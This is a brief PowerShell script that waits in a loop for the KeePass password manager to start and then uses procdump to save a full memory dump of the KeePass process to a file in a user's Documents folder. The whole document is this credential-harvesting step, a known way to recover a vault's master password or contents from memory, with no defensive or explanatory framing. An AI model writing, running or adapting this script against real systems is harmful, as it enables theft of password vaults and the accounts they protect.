# Define the name of the process to monitor and the path to procdump
$processName = "keepass"
$procDumpPath = "C:\Users\ngodfrey\Documents\procdump.exe"
$dumpOutputPath = "C:\Users\ngodfrey\Documents\keepass_dump.dmp"

# Function to monitor KeePass process and dump memory
function Monitor-KeePass {
    Write-Host "Monitoring KeePass process..."

    while ($true) {
        # Check if KeePass process is running
        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue

        if ($process) {
            Write-Host "KeePass process detected! Executing procdump..."
            Start-Process -FilePath $procDumpPath -ArgumentList "-ma", $process.Id, $dumpOutputPath
            Write-Host "Memory dump saved to $dumpOutputPath"
            break
        }

        # Wait for 10 seconds before checking again
        Start-Sleep -Seconds 10
    }
}

# Start monitoring KeePass
Monitor-KeePass
